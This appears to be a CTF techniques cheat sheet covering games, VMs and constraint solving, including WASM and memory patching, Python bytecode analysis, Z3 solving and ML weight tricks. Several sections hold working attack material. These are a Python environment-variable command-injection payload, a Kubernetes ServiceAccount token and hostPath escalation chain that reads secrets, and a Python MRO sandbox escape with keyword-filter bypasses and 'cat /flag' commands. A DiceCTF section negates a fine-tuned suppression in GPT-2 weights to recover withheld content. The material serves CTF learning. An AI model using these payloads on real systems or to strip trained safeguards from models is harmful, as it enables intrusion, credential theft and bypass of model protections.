# CTF Misc - Games, VMs & Constraint Solving

## Table of Contents
- [WASM Game Exploitation via Patching](#wasm-game-exploitation-via-patching)
- [Roblox Place File Reversing](#roblox-place-file-reversing)
- [PyInstaller Extraction](#pyinstaller-extraction)
  - [Opcode Remapping](#opcode-remapping)
- [Marshal Code Analysis](#marshal-code-analysis)
  - [Bytecode Inspection Tips](#bytecode-inspection-tips)
- [Python Environment RCE](#python-environment-rce)
- [Z3 Constraint Solving](#z3-constraint-solving)
  - [YARA Rules with Z3](#yara-rules-with-z3)
  - [Type Systems as Constraints](#type-systems-as-constraints)
- [Kubernetes RBAC Bypass](#kubernetes-rbac-bypass)
  - [K8s Privilege Escalation Checklist](#k8s-privilege-escalation-checklist)
- [Floating-Point Precision Exploitation](#floating-point-precision-exploitation)
  - [Finding Exploitable Values](#finding-exploitable-values)
  - [Exploitation Strategy](#exploitation-strategy)
  - [Why It Works](#why-it-works)
  - [Red Flags in Challenges](#red-flags-in-challenges)
  - [Quick Test Script](#quick-test-script)
- [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
- [memfd_create Packed Binaries](#memfd_create-packed-binaries)
- [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
- [ML Model Weight Perturbation Negation (DiceCTF 2026)](#ml-model-weight-perturbation-negation-dicectf-2026)
- [Cookie Checkpoint Game Brute-Forcing (BYPASS CTF 2025)](#cookie-checkpoint-game-brute-forcing-bypass-ctf-2025)
- [Flask Session Cookie Game State Leakage (BYPASS CTF 2025)](#flask-session-cookie-game-state-leakage-bypass-ctf-2025)
- [WebSocket Game Manipulation + Cryptic Hint Decoding (BYPASS CTF 2025)](#websocket-game-manipulation--cryptic-hint-decoding-bypass-ctf-2025)
- [Server Time-Only Validation Bypass (BYPASS CTF 2025)](#server-time-only-validation-bypass-bypass-ctf-2025)
- [LoRA Adapter Weight Merging and Visualization (ApoorvCTF 2026)](#lora-adapter-weight-merging-and-visualization-apoorvctf-2026)
- [De Bruijn Sequence for Substring Coverage (BearCatCTF 2026)](#de-bruijn-sequence-for-substring-coverage-bearcatctf-2026)
- [Brainfuck Interpreter Instrumentation (BearCatCTF 2026)](#brainfuck-interpreter-instrumentation-bearcatctf-2026)
- [WASM Linear Memory Manipulation (BearCatCTF 2026)](#wasm-linear-memory-manipulation-bearcatctf-2026)
- [References](#references)

---

## WASM Game Exploitation via Patching

**Pattern (Tac Tic Toe, Pragyan 2026):** Game with unbeatable AI in WebAssembly. Proof/verification system validates moves but doesn't check optimality.

**Key insight:** If the proof generation depends only on move positions and seed (not on whether moves were optimal), patching the WASM to make the AI play badly produces a beatable game with valid proofs.

**Patching workflow:**
```bash
# 1. Convert WASM binary to text format
wasm2wat main.wasm -o main.wat

# 2. Find the minimax function (look for bestScore initialization)
# Change initial bestScore from -1000 to 1000
# Flip comparison: i64.lt_s -> i64.gt_s (selects worst moves instead of best)

# 3. Recompile
wat2wasm main.wat -o main_patched.wasm
```

**Exploitation:**
```javascript
const go = new Go();
const result = await WebAssembly.instantiate(
  fs.readFileSync("main_patched.wasm"), go.importObject
);
go.run(result.instance);

InitGame(proof_seed);
// Play winning moves against weakened AI
for (const m of [0, 3, 6]) {
    PlayerMove(m);
}
const data = GetWinData();
// Submit data.moves and data.proof to server -> valid!
```

**General lesson:** In client-side game challenges, always check if the verification/proof system is independent of move quality. If so, patch the game logic rather than trying to beat it.

---

## Roblox Place File Reversing

**Pattern (MazeRunna, 0xFun 2026):** Roblox game where the flag is hidden in an older published version. Latest version contains a decoy flag.

**Step 1: Identify target IDs from game page HTML:**
```python
placeId = 75864087736017
universeId = 8920357208
```

**Step 2: Pull place versions via Roblox Asset Delivery API:**
```bash
# Requires .ROBLOSECURITY cookie (rotate after CTF!)
for v in 1 2 3; do
  curl -H "Cookie: .ROBLOSECURITY=..." \
    "https://assetdelivery.roblox.com/v2/assetId/${PLACE_ID}/version/$v" \
    -o place_v${v}.rbxlbin
done
```

**Step 3: Parse .rbxlbin binary format:**
The Roblox binary place format contains typed chunks:
- **INST** — defines class buckets (Script, Part, etc.) and referent IDs
- **PROP** — per-instance property values (including `Source` for scripts)
- **PRNT** — parent→child relationships forming the object tree

```python
# Pseudocode for extracting scripts
for chunk in parse_chunks(data):
    if chunk.type == 'PROP' and chunk.field == 'Source':
        for referent, source in chunk.entries:
            if source.strip():
                print(f"[{get_path(referent)}] {source}")
```

**Step 4: Diff script sources across versions.**
- v3 (latest): `Workspace/Stand/Color/Script` → fake flag
- v2 (older): same path → real flag

**Key lessons:**
- Always check **version history** — latest version may be a decoy
- Roblox Asset Delivery API exposes all published versions
- Rotate `.ROBLOSECURITY` cookie immediately after use (it's a full session token)

---

## PyInstaller Extraction

```bash
python pyinstxtractor.py packed.exe
# Look in packed.exe_extracted/
```

### Opcode Remapping
If decompiler fails with opcode errors:
1. Find modified `opcode.pyc`
2. Build mapping to original values
3. Patch target .pyc
4. Decompile normally

---

## Marshal Code Analysis

```python
import marshal, dis
with open('file.bin', 'rb') as f:
    code = marshal.load(f)
dis.dis(code)
```

### Bytecode Inspection Tips
- `co_consts` contains literal values (strings, numbers)
- `co_names` contains referenced names (function names, variables)
- `co_code` is the raw bytecode
- Use `dis.Bytecode(code)` for instruction-level iteration

---

## Python Environment RCE

```bash
PYTHONWARNINGS=ignore::antigravity.Foo::0
BROWSER="/bin/sh -c 'cat /flag' %s"
```

**Other dangerous environment variables:**
- `PYTHONSTARTUP` - Script executed on interactive startup
- `PYTHONPATH` - Inject modules via path hijacking
- `PYTHONINSPECT` - Drop to interactive shell after script

**How PYTHONWARNINGS works:** Setting `PYTHONWARNINGS=ignore::antigravity.Foo::0` triggers `import antigravity`, which opens a URL via `$BROWSER`. Control `$BROWSER` to execute arbitrary commands.

---

## Z3 Constraint Solving

```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
s.add(flag[0] == ord('f'))  # Known prefix
# Add constraints...
if s.check() == sat:
    print(bytes([s.model()[f].as_long() for f in flag]))
```

### YARA Rules with Z3
```python
from z3 import *

flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()

# Literal bytes
for i, byte in enumerate([0x66, 0x6C, 0x61, 0x67]):
    s.add(flag[i] == byte)

# Character range
for i in range(4):
    s.add(flag[i] >= ord('A'))
    s.add(flag[i] <= ord('Z'))

if s.check() == sat:
    m = s.model()
    print(bytes([m[f].as_long() for f in flag]))
```

### Type Systems as Constraints
**OCaml GADTs / advanced types encode constraints.**

Don't compile - extract constraints with regex and solve with Z3:
```python
import re
from z3 import *

matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
# Convert to Z3 constraints and solve
```

---

## Kubernetes RBAC Bypass

**Pattern (CTFaaS, LACTF 2026):** Container deployer with claimed ServiceAccount isolation.

**Attack chain:**
1. Deploy probe container that reads in-pod ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`
2. Verify token can impersonate deployer SA (common misconfiguration)
3. Create pod with `hostPath` volume mounting `/` -> read node filesystem
4. Extract kubeconfig (e.g., `/etc/rancher/k3s/k3s.yaml`)
5. Use node credentials to access hidden namespaces and read secrets

```bash
# From inside pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/hidden/secrets/flag
```

### K8s Privilege Escalation Checklist
- Check RBAC: `kubectl auth can-i --list`
- Look for pod creation permissions (can create privileged pods)
- Check for hostPath volume mounts allowed in PSP/PSA
- Look for secrets in environment variables of other pods
- Check for service mesh sidecars leaking credentials

---

## Floating-Point Precision Exploitation

**Pattern (Spare Me Some Change):** Trading/economy games where large multipliers amplify tiny floating-point errors.

**Key insight:** When decimal values (0.01-0.99) are multiplied by large numbers (e.g., 1e15), floating-point representation errors create fractional remainders that can be exploited.

### Finding Exploitable Values
```python
mult = 1000000000000000  # 10^15

# Find values where multiplication creates useful fractional errors
for i in range(1, 100):
    x = i / 100.0
    result = x * mult
    frac = result - int(result)
    if frac > 0:
        print(f'x={x}: {result} (fraction={frac})')

# Common values with positive fractions:
# 0.07 -> 70000000000000.0078125
# 0.14 -> 140000000000000.015625
# 0.27 -> 270000000000000.03125
# 0.56 -> 560000000000000.0625
```

### Exploitation Strategy
1. **Identify the constraint**: Need `balance >= price` AND `inventory >= fee`
2. **Find favorable FP error**: Value where `x * mult` has positive fraction
3. **Key trick**: Sell the INTEGER part of inventory, keeping the fractional "free money"

**Example (time-travel trading game):**
```text
Initial: balance=5.00, inventory=0.00, flag_price=5.00, fee=0.05
Multiplier: 1e15 (time travel)

# Buy 0.56, travel through time:
balance = (5.0 - 0.56) * 1e15 = 4439999999999999.5
inventory = 0.56 * 1e15 = 560000000000000.0625

# Sell exactly 560000000000000 (integer part):
balance = 4439999999999999.5 + 560000000000000 = 5000000000000000.0 (FP rounds!)
inventory = 560000000000000.0625 - 560000000000000 = 0.0625 > 0.05 fee

# Now: balance >= flag_price AND inventory >= fee
```

### Why It Works
- Float64 has ~15-16 significant digits precision
- `(5.0 - 0.56) * 1e15` loses precision -> rounds to exact 5e15 when added
- `0.56 * 1e15` keeps the 0.0625 fraction as "free inventory"
- The asymmetric rounding gives you slightly more total value than you started with

### Red Flags in Challenges
- "Time travel amplifies everything" (large multipliers)
- Trading games with buy/sell + special actions
- Decimal currency with fees or thresholds
- "No decimals allowed" after certain operations (forces integer transactions)
- Starting values that seem impossible to win with normal math

### Quick Test Script
```python
def find_exploit(mult, balance_needed, inventory_needed):
    """Find x where selling int(x*mult) gives balance>=needed with inv>=needed"""
    for i in range(1, 500):
        x = i / 100.0
        if x >= 5.0:  # Can't buy more than balance
            break
        inv_after = x * mult
        bal_after = (5.0 - x) * mult

        # Sell integer part of inventory
        sell = int(inv_after)
        final_bal = bal_after + sell
        final_inv = inv_after - sell

        if final_bal >= balance_needed and final_inv >= inventory_needed:
            print(f'EXPLOIT: buy {x}, sell {sell}')
            print(f'  final_balance={final_bal}, final_inventory={final_inv}')
            return x
    return None

# Example usage:
find_exploit(1e15, 5e15, 0.05)  # Returns 0.56
```

---

## Custom Assembly Language Sandbox Escape (EHAX 2026)

**Pattern (Chusembly):** Web app with custom instruction set (LD, PUSH, PROP, CALL, IDX, etc.) running on a Python backend. Safety check only blocks the word "flag" in source code.

**Key insight:** `PROP` (property access) and `CALL` (function invocation) instructions allow traversing Python's MRO chain from any object to achieve RCE, similar to Jinja2 SSTI.

**Exploit chain:**
```text
LD 0x48656c6c6f A     # Load "Hello" string into register A
PROP __class__ A      # str → <class 'str'>
PROP __base__ E       # str → <class 'object'> (E = result register)
PROP __subclasses__ E # object → bound method
CALL E                # object.__subclasses__() → list of all classes
# Find os._wrap_close at index 138 (varies by Python version)
IDX 138 E             # subclasses[138] = os._wrap_close
PROP __init__ E       # get __init__ method
PROP __globals__ E    # access function globals
# Use __getitem__ to access builtins without triggering keyword filter
PUSH 0x5f5f6275696c74696e735f5f  # "__builtins__" as hex
CALL __getitem__ E               # globals["__builtins__"]
# Bypass "flag" keyword filter with hex encoding
PUSH 0x666c61672e747874          # "flag.txt" as hex
CALL open E                      # open("flag.txt")
CALL read E                      # read file contents
STDOUT E                         # print flag
```

**Filter bypass techniques:**
- **Hex-encoded strings:** `0x666c61672e747874` → `"flag.txt"` bypasses keyword filters
- **os.popen for shell:** If file path is unknown, use `os.popen('ls /').read()` then `os.popen('cat /flag*').read()`
- **Subclass index discovery:** Iterate through `__subclasses__()` list to find useful classes (os._wrap_close, subprocess.Popen, etc.)

**General approach for custom language challenges:**
1. **Read the docs:** Check `/docs`, `/help`, `/api` endpoints for instruction reference
2. **Find the result register:** Many custom languages have a special register for return values
3. **Test string handling:** Try hex-encoded strings to bypass keyword filters
4. **Chain Python MRO:** Any Python string object → `__class__.__base__.__subclasses__()` → RCE
5. **Error messages leak info:** Intentional errors reveal Python internals and available classes

---

## memfd_create Packed Binaries

```python
from Crypto.Cipher import ARC4
cipher = ARC4.new(b"key")
decrypted = cipher.decrypt(encrypted_data)
open("dumped", "wb").write(decrypted)
```

---

## Multi-Phase Interactive Crypto Game (EHAX 2026)

**Pattern (The Architect's Gambit):** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.

**Phase structure:**
1. **Phase 1 (AES-ECB decryption):** Decrypt pile values with provided key. Determine winner from game state.
2. **Phase 2 (AES-CBC with derived keys):** Keys derived via SHA-256 chain from Phase 1 results. Decrypt to get game parameters.
3. **Phase 3 (Interactive gameplay):** Play optimal moves in a combinatorial game, bound by commitment-reveal protocol.

**Commitment-reveal (HMAC binding):**
```python
import hmac, hashlib

def compute_binding_token(session_nonce, answer):
    """Server verifies your answer commitment before revealing result."""
    message = f"answer:{answer}".encode()
    return hmac.new(session_nonce, message, hashlib.sha256).hexdigest()

# Flow: send token first, then server reveals state, then send answer
# Server checks: HMAC(nonce, answer) == your_token
# Prevents changing your answer after seeing the state
```

**GF(2^8) arithmetic for game drain calculations:**
```python
# Galois Field GF(256) used in some game mechanics (Nim variants)
# Nim-value XOR determines winning/losing positions

def gf256_mul(a, b, poly=0x11b):
    """Multiply in GF(2^8) with irreducible polynomial."""
    result = 0
    while b:
        if b & 1:
            result ^= a
        a <<= 1
        if a & 0x100:
            a ^= poly
        b >>= 1
    return result

# Nim game with GF(256) move rules:
# Position is losing if Nim-value (XOR of pile Grundy values) is 0
# Optimal move: find pile where removing stones makes XOR sum = 0
```

**Game tree memoization (C++ for performance):**
```python
# Python too slow for large state spaces — use C++ with memoization
# State compression: encode all pile sizes into single integer
# Cache: unordered_map<state_t, bool> for win/loss determination

# Python fallback for small games:
from functools import lru_cache

@lru_cache(maxsize=None)
def is_winning(state):
    """Returns True if current player can force a win."""
    state = tuple(sorted(state))  # Normalize for caching
    for move in generate_moves(state):
        next_state = apply_move(state, move)
        if not is_winning(next_state):
            return True  # Found a move that puts opponent in losing position
    return False  # All moves lead to opponent winning
```

**Key insights:**
- Multi-phase challenges require solving each phase sequentially — each phase's output feeds the next
- HMAC commitment-reveal prevents guessing; you must compute the correct answer
- GF(256) Nim variants require Sprague-Grundy theory, not brute force
- When Python recursion is too slow (>10s), rewrite game solver in C++ with state compression and memoization

---

## ML Model Weight Perturbation Negation (DiceCTF 2026)

**Pattern (leadgate):** A modified GPT-2 model fine-tuned to suppress a specific string (the flag). Negate the weight perturbation to invert suppression into promotion — the model eagerly outputs the formerly forbidden string.

**Technique:**
```python
from transformers import GPT2LMHeadModel, GPT2Tokenizer
from safetensors.torch import load_file

tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
chal_weights = load_file("model.safetensors")
orig_model = GPT2LMHeadModel.from_pretrained("gpt2")
orig_state = {k: v.clone() for k, v in orig_model.state_dict().items()}

# Negate the perturbation: neg = orig - (chal - orig) = 2*orig - chal
neg_state = {}
for key in chal_weights:
    if key in orig_state:
        diff = chal_weights[key].float() - orig_state[key]
        neg_state[key] = orig_state[key] - diff

neg_model = GPT2LMHeadModel.from_pretrained("gpt2")
neg_model.load_state_dict(neg_state)
neg_model.eval()

# Greedy decode from flag prefix
input_ids = tokenizer.encode("dice{", return_tensors="pt")
output = neg_model.generate(input_ids, max_new_tokens=30, do_sample=False)
print(tokenizer.decode(output[0]))
```

**Why it works:** Fine-tuning with suppression instructions adds perturbation ΔW to original weights. The perturbation has rank-1 structure (visible via SVD) — a single "suppression direction." Computing `W_orig - ΔW` flips suppression into promotion.

**Detection via SVD:**
```python
import torch

for key in chal_weights:
    if key in orig_state and chal_weights[key].dim() >= 2:
        diff = chal_weights[key].float() - orig_state[key]
        U, S, V = torch.svd(diff)
        # Rank-1 perturbation: S[0] >> S[1]
        if S[0] > 10 * S[1]:
            print(f"{key}: rank-1 perturbation (suppression direction)")
```

**When to use:** Challenge provides a model file (safetensors, .bin, .pt) and the model architecture is known (GPT-2, LLaMA, etc.). The challenge asks you to extract hidden/suppressed content from the model.

**Key insight:** Instruction-tuned suppression creates a weight-space perturbation that can be detected (rank-1 SVD signature) and inverted (negate diff). This works for any model where the base weights are publicly available.

---

## Cookie Checkpoint Game Brute-Forcing (BYPASS CTF 2025)

**Pattern (Signal from the Deck):** Server-side game where selecting tiles increases score. Incorrect choice resets the game. Score tracked via session cookies.

**Technique:** Save cookies before each guess, restore on failure to avoid resetting progress.

```python
import requests

URL = "https://target.example.com"

def solve():
    s = requests.Session()
    s.post(f"{URL}/api/new")

    while True:
        data = s.get(f"{URL}/api/signal").json()
        if data.get('done'):
            break

        checkpoint = s.cookies.get_dict()

        for tile_id in range(1, 10):
            r = s.post(f"{URL}/api/click", json={'clicked': tile_id})
            res = r.json()

            if res.get('correct'):
                if res.get('done'):
                    print(f"FLAG: {res.get('flag')}")
                    return
                break
            else:
                s.cookies.clear()
                s.cookies.update(checkpoint)
```

**Key insight:** Session cookies act as save states. Preserving and restoring cookies on failure enables deterministic brute-forcing without game reset penalties.

---

## Flask Session Cookie Game State Leakage (BYPASS CTF 2025)

**Pattern (Hungry, Not Stupid):** Flask game stores correct answers in signed session cookies. Use `flask-unsign -d` to decode the cookie and reveal server-side game state without playing.

```bash
# Decode Flask session cookie (no secret needed for reading)
flask-unsign -d -c '<cookie_value>'
```

**Example decoded state:**
```json
{
  "all_food_pos": [{"x": 16, "y": 12}, {"x": 16, "y": 28}, {"x": 9, "y": 24}],
  "correct_food_pos": {"x": 16, "y": 28},
  "level": 0
}
```

**Key insight:** Flask session cookies are signed but not encrypted by default. `flask-unsign -d` decodes them without the secret key, exposing server-side game state including correct answers.

**Detection:** Base64-looking session cookies with periods (`.`) separating segments. Flask uses `itsdangerous` signing format.

---

## WebSocket Game Manipulation + Cryptic Hint Decoding (BYPASS CTF 2025)

**Pattern (Maze of the Unseen):** Browser-based maze game with invisible walls. Checkpoints verified server-side via WebSocket. Cryptic hint encodes target coordinates.

**Technique:**
1. Open browser console, inspect WebSocket messages and `player` object
2. Decode cryptic hints (e.g., "mosquito were not available" → MQTT → port 1883)
3. Teleport directly to target coordinates via console

```javascript
function teleport(x, y) {
    player.x = x;
    player.y = y;
    verifyProgress(Math.round(player.x), Math.round(player.y));
    console.log(`Teleported to x:${player.x}, y:${player.y}`);
}

// "mosquito" → MQTT (port 1883), "not available" → 404
teleport(1883, 404);
```

**Common cryptic hint mappings:**
- "mosquito" → MQTT (Mosquitto broker, port 1883)
- "not found" / "not available" → HTTP 404
- Port numbers, protocol defaults, or ASCII values as coordinates

**Key insight:** Browser-based games expose their state in the JS console. Modify `player.x`/`player.y` or equivalent properties directly, then call the progress verification function.

---

## Server Time-Only Validation Bypass (BYPASS CTF 2025)

**Pattern (Level Devil):** Side-scrolling game requiring traversal of a map. Server validates that enough time has elapsed (map_length / speed) but doesn't verify actual movement.

```python
import requests
import time

TARGET = "https://target.example.com"

s = requests.Session()
r = s.post(f"{TARGET}/api/start")
session_id = r.json().get('session_id')

# Wait for required traversal time (e.g., 4800px / 240px/s = 20s + margin)
time.sleep(25)

s.post(f"{TARGET}/api/collect_flag", json={'session_id': session_id})
r = s.post(f"{TARGET}/api/win", json={'session_id': session_id})
print(r.json().get('flag'))
```

**Key insight:** When servers validate only elapsed time (not player position, inputs, or movement), start a session, sleep for the required duration, then submit the win request. Always check if the game API has start/win endpoints that can be called directly.

---

## LoRA Adapter Weight Merging and Visualization (ApoorvCTF 2026)

**Pattern (Hefty Secrets):** Two PyTorch checkpoints — a base model and a LoRA (Low-Rank Adaptation) adapter. Merging the adapter into the base model produces a weight matrix encoding a hidden bitmap image.

**LoRA merging:** `W' = W + B @ A` where `B` (256×64) and `A` (64×256) are the low-rank matrices. The product is a full 256×256 matrix.

```python
import torch
import numpy as np
from PIL import Image

base = torch.load('base_model.pt', map_location='cpu', weights_only=False)
lora = torch.load('lora_adapter.pt', map_location='cpu', weights_only=False)

# Merge: W' = W + B @ A
merged = base['layer2.weight'] + lora['layer2.lora_B'] @ lora['layer2.lora_A']

# Threshold to binary image — values cluster at 0 or 1
binary = (merged > 0.5).int().numpy().astype(np.uint8)
img = Image.fromarray((1 - binary) * 255)  # Invert: 0→white, 1→black
img.save('flag.png')
```

**Key insight:** LoRA adapters are low-rank matrix decompositions designed for fine-tuning. The product of the two small matrices can encode arbitrary data in the full weight matrix. Threshold and visualize — if values cluster near 0 and 1, it's a binary image.

**Detection:** Challenge provides two PyTorch `.pt` files (base + adapter), mentions "LoRA", "fine-tuning", or "adapter". PyTorch unzipped checkpoint format stores `data.pkl` + numbered data files in a directory; re-zip to load with `torch.load()`.

---

## De Bruijn Sequence for Substring Coverage (BearCatCTF 2026)

**Pattern (Brown's Revenge):** Server generates random n-bit binary code each round. Input must contain the code as a substring. Pass 20+ rounds with a single fixed input under a character limit.

```python
def de_bruijn(k, n):
    """Generate de Bruijn sequence B(k, n): cyclic sequence containing
    every k-ary string of length n exactly once as a substring."""
    a = [0] * k * n
    sequence = []
    def db(t, p):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p+1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)
    db(1, 1)
    return sequence

# For 12-bit binary codes: B(2, 12) has length 4096
seq = ''.join(map(str, de_bruijn(2, 12)))
payload = seq + seq[:11]  # Linearize: 4096 + 11 = 4107 chars
# Every possible 12-bit code appears as a substring
```

**Key insight:** De Bruijn sequence B(k, n) contains all k^n possible n-length strings over alphabet k as substrings, with cyclic length k^n. To linearize (non-cyclic), append the first n-1 characters. Total length = k^n + n - 1. Send the same string every round — it contains every possible code.

**Detection:** Must find arbitrary n-bit pattern as substring of limited-length input. Character budget matches de Bruijn length (k^n + n - 1).

---

## Brainfuck Interpreter Instrumentation (BearCatCTF 2026)

**Pattern (Ghost Ship):** Large Brainfuck program (10K+ instructions) validates a flag character-by-character. Full reverse engineering is impractical.

**Per-character brute-force via instrumentation:**
1. Instrument a Brainfuck interpreter to track tape cell values
2. Identify a "wrong count" cell that increments per incorrect character
3. For each position, try all printable ASCII — pick the character that doesn't increment the wrong counter

```python
def run_bf_instrumented(code, input_bytes, max_steps=500000):
    tape = [0] * 30000
    dp, ip, inp_idx = 0, 0, 0
    for _ in range(max_steps):
        if ip >= len(code): break
        c = code[ip]
        if c == '+': tape[dp] = (tape[dp] + 1) % 256
        elif c == '-': tape[dp] = (tape[dp] - 1) % 256
        elif c == '>': dp += 1
        elif c == '<': dp -= 1
        elif c == '.': pass  # output
        elif c == ',':
            tape[dp] = input_bytes[inp_idx] if inp_idx < len(input_bytes) else 0
            inp_idx += 1
        elif c == '[' and tape[dp] == 0:
            # skip to matching ]
            ...
        elif c == ']' and tape[dp] != 0:
            # jump back to matching [
            ...
        ip += 1
    return tape

# Brute-force: ~40 positions × 95 chars = 3800 runs
flag = []
for pos in range(40):
    for c in range(32, 127):
        candidate = flag + [c] + [ord('A')] * (39 - pos)
        tape = run_bf_instrumented(code, candidate)
        if tape[WRONG_COUNT_CELL] == 0:  # No errors up to this position
            flag.append(c)
            break
```

**Key insight:** Brainfuck programs that validate input character-by-character can be brute-forced without understanding the program logic. Instrument the interpreter to observe tape state, find the cell that tracks validation progress, and optimize per-character search. ~3800 runs completes in minutes.

---

## WASM Linear Memory Manipulation (BearCatCTF 2026)

**Pattern (Dubious Doubloon):** Browser game compiled to WebAssembly with win conditions requiring luck (e.g., 15 consecutive coin flips). WASM linear memory is flat and unprotected.

**Direct memory patching in Node.js:**
```javascript
const { readFileSync } = require('fs');
const wasmBuffer = readFileSync('game.wasm');
const { instance } = await WebAssembly.instantiate(wasmBuffer, imports);
const mem = new DataView(instance.exports.memory.buffer);

// Patch game variables at known offsets
mem.setInt32(0x102918, 14, true);   // streak counter = 14 (need 15)
mem.setInt32(0x102898, 100, true);  // win chance = 100%

// One more flip → guaranteed win → flag decoded
const result = instance.exports.flipCoin();
```

**Key insight:** Unlike WAT patching (modifying the binary), memory manipulation patches runtime state after loading. All WASM variables live in flat linear memory at fixed offsets. Use `wasm-objdump -x game.wasm` or search for known constants to find variable offsets. No need to understand the full game logic — just set the state to "about to win".

**Detection:** WASM game requiring statistically impossible sequences (streaks, perfect scores). Game logic is in `.wasm` file loadable in Node.js.

---

## References
- Pragyan 2026 "Tac Tic Toe": WASM minimax patching
- LACTF 2026 "CTFaaS": K8s RBAC bypass via hostPath
- 0xL4ugh CTF: PyInstaller + opcode remapping
- 0xFun 2026 "MazeRunna": Roblox version history + binary place file parsing
- EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
- EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE
- DiceCTF 2026 "leadgate": ML weight perturbation negation for flag extraction
- BYPASS CTF 2025 "Signal from the Deck": Cookie checkpoint game brute-forcing
- BYPASS CTF 2025 "Hungry, Not Stupid": Flask cookie game state leakage
- BYPASS CTF 2025 "Maze of the Unseen": WebSocket teleportation + cryptic hints
- BYPASS CTF 2025 "Level Devil": Server time-only validation bypass
- ApoorvCTF 2026 "Hefty Secrets": LoRA adapter weight merging and bitmap visualization
- BearCatCTF 2026 "Brown's Revenge": De Bruijn sequence substring coverage
- BearCatCTF 2026 "Ghost Ship": Brainfuck instrumentation brute-force
- BearCatCTF 2026 "Dubious Doubloon": WASM linear memory state patching
